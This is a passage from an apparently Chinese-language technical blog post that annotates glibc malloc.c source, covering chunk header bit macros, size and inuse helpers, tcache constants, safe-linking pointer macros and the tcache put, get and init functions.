class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   --------------- Physical chunk operations ---------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="comment">/*一个测试位，就是之前提到的mchunk_size中的末3位复用部分，最后一位代表了物理相邻的上一个chunk是否被使用*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="comment">/*与操作测试，判断上一个chunk是否被使用*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="comment">/*同，倒数第二位代表了该chunk是否被mmap分配*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*与操作测试，判断该chunk是否是mmap分配的*/</span></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="comment">/*同，倒数第二位代表了该chunk是否属于主线程*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*与操作测试，判断该chunk是否属于主线程(0代表属于主线程)*/</span></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="comment">/*或上 NON_MAIN_ARENA，把一个mark标记为不再属于主线程(*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*所有的测试位，当提取大小时需要被mask off*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="comment">/*忽略测试位，提取大小(简而言之就是mchunk_size末3比特位全部置0)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="comment">/*直接提取mchunk_size*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize_nomask(p)         ((p)-&gt;mchunk_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to next physical malloc_chunk. */</span></span><br><span class="line"><span class="comment">/*获取物理相邻的下一个chunk(本chunk的地址+本chunk大小)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="comment">/*物理相邻上一个chunk的size(只有上一个chunk是free的时候才合法)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the size of the chunk below P.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="comment">/*设置物理相邻上一个chunk的size(该chunk的 mchunk_prev_size)(只有上一个chunk是free的时候才合法)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_prev_size(p, sz) ((p)-&gt;mchunk_prev_size = (sz))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Ptr to previous physical malloc_chunk.  Only valid if !prev_inuse (P).  */</span></span><br><span class="line"><span class="comment">/*上一个chunk的地址(该chunk的地址减去上一个chunk的大小)(只有上一个chunk是free的时候才合法)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_chunk(p) ((mchunkptr) (((char *) (p)) - prev_size (p)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="comment">/*把地址ptr+offset处视为一个chunk*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="comment">/*检测chunk p是否被使用(也就是p下一个chunk的prev_inuse是否为1)*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inuse(p)							      \</span></span><br><span class="line">  ((((mchunkptr) (((<span class="keyword">char</span> *) (p)) + chunksize (p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="comment">/* 设置 chunk p状态为被使用 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_inuse(p)							      \</span></span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + chunksize (p)))-&gt;mchunk_size |= PREV_INUSE</span><br><span class="line"><span class="comment">/* 清除 chunk p的被使用状态 */</span></span><br><span class="line">#define clear_inuse(p)							      \</span><br><span class="line">  ((mchunkptr) (((<span class="keyword">char</span> *) (p)) + chunksize (p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check/set/clear inuse bits in known places */</span></span><br><span class="line"><span class="comment">/*检查/设置/清楚 某个地方的inuse位*/</span></span><br><span class="line">#define inuse_bit_at_offset(p, s)					      \</span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span><br><span class="line"></span><br><span class="line">#define set_inuse_bit_at_offset(p, s)					      \</span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size |= PREV_INUSE)</span><br><span class="line"></span><br><span class="line">#define clear_inuse_bit_at_offset(p, s)					      \</span><br><span class="line">  (((mchunkptr) (((<span class="keyword">char</span> *) (p)) + (s)))-&gt;mchunk_size &amp;= ~(PREV_INUSE))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="comment">/*在不扰乱测试位的情况下设置大小 (个人感觉应该还需要对s进行一个检测把?)*/</span></span><br><span class="line">#define set_head_size(p, s)  ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="comment">/*直接更改mchunk_size(有可能改变测试位)*/</span></span><br><span class="line">#define set_head(p, s)       ((p)-&gt;mchunk_size = (s))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="comment">/*把p+s处的chunk的mchunk_prev_size写为s(只有当chunk p为不被使用的时候才行)*/</span></span><br><span class="line">#define set_foot(p, s)       (((mchunkptr) ((<span class="keyword">char</span> *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span><br><span class="line"></span><br><span class="line">#pragma GCC poison mchunk_size</span><br><span class="line">#pragma GCC poison mchunk_prev_size</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is the size of the real usable data in the chunk.  Not valid for</span></span><br><span class="line"><span class="comment">   dumped heap chunks.  */</span></span><br><span class="line"><span class="comment">/*用户真正使用的部分大小(也就是之前说的数据部分)*/</span></span><br><span class="line">#define memsize(p)                                                    \</span><br><span class="line">  (__MTAG_GRANULE_SIZE &gt; SIZE_SZ &amp;&amp; __glibc_unlikely (mtag_enabled) ? \</span><br><span class="line">    chunksize (p) - CHUNK_HDR_SZ :                                    \</span><br><span class="line">    chunksize (p) - CHUNK_HDR_SZ + (chunk_is_mmapped (p) ? <span class="number">0</span> : SIZE_SZ))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If memory tagging is enabled the layout changes to accommodate the granule</span></span><br><span class="line"><span class="comment">   size, this is wasteful for small allocations so not done by default.</span></span><br><span class="line"><span class="comment">   Both the chunk header and user data has to be granule aligned.  */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Tcache相关的宏"><a href="#Tcache相关的宏" class="headerlink" title="Tcache相关的宏"></a>Tcache相关的宏</h5><p>还有一些tcache用到的宏(tcache是啥？是一种bin。bin是啥？后面就介绍了)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="comment">/*TCACHE_MAX_BINS应该是定义了最多的条目数量。这个限制不是绝对的，而是可更改的*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS		64</span></span><br><span class="line"><span class="comment">/*最大的能放进tcache的SIZE，*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_SIZE	tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="comment">/*换算出对应id的tcache bin所收录的chunk的大小*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> tidx2usize(idx)	(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="comment">/*从chunksize()提供的size换算到符合的tcache bin的id*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="comment">/*从用户提供的size换算到符合的tcache bin的id*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="comment">/*决定了每个tcache bin所能容纳的chunk大小*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="comment">/*似乎是全体tcache bins所能容纳的chunk的数量*/</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Safe-Linking:</span></span><br><span class="line"><span class="comment">   Use randomness from ASLR (mmap_base) to protect single-linked lists</span></span><br><span class="line"><span class="comment">   of Fast-Bins and TCache.  That is, mask the &quot;next&quot; pointers of the</span></span><br><span class="line"><span class="comment">   lists&#x27; chunks, and also perform allocation alignment checks on them.</span></span><br><span class="line"><span class="comment">   This mechanism reduces the risk of pointer hijacking, as was done with</span></span><br><span class="line"><span class="comment">   Safe-Unlinking in the double-linked lists of Small-Bins.</span></span><br><span class="line"><span class="comment">   It assumes a minimum page size of 4096 bytes (12 bits).  Systems with</span></span><br><span class="line"><span class="comment">   larger pages provide less entropy, although the pointer mangling</span></span><br><span class="line"><span class="comment">   still works.  */</span></span><br><span class="line"><span class="comment">/*glibc 2.32后引入的指针加密的操作，主要是一个简单的右移异或的加密方式*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在malloc.c后半段也有一些关于Tcache的宏</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> key;</span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread <span class="keyword">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Process-wide key to try and catch a double-free in the same thread.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uintptr_t</span> tcache_key;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The value of tcache_key does not really have to be a cryptographically</span></span><br><span class="line"><span class="comment">   secure random number.  It only needs to be arbitrary enough so that it does</span></span><br><span class="line"><span class="comment">   not collide with values present in applications.  If a collision does happen</span></span><br><span class="line"><span class="comment">   consistently enough, it could cause a degradation in performance since the</span></span><br><span class="line"><span class="comment">   entire list is checked to check if the block indeed has been freed the</span></span><br><span class="line"><span class="comment">   second time.  The odds of this happening are exceedingly low though, about 1</span></span><br><span class="line"><span class="comment">   in 2^wordsize.  There is probably a higher chance of the performance</span></span><br><span class="line"><span class="comment">   degradation being due to a double free where the first free happened in a</span></span><br><span class="line"><span class="comment">   different thread; that&#x27;s a case this check does not cover.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_key_initialize (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_thread_shutdown (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">	&#123;</span><br><span class="line">	  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;tcache_thread_shutdown(): &quot;</span></span><br><span class="line">			     <span class="string">&quot;unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">	  tcache_tmp-&gt;entries[i] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">	  __libc_free (e);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tcache == <span class="literal">NULL</span>)) \</span><br><span class="line">    tcache_init();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* !USE_TCACHE */</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_thread_shutdown (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Nothing to do if there is no thread cache.  */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* !USE_TCACHE  */</span></span></span><br></pre></td></tr></table></figure>
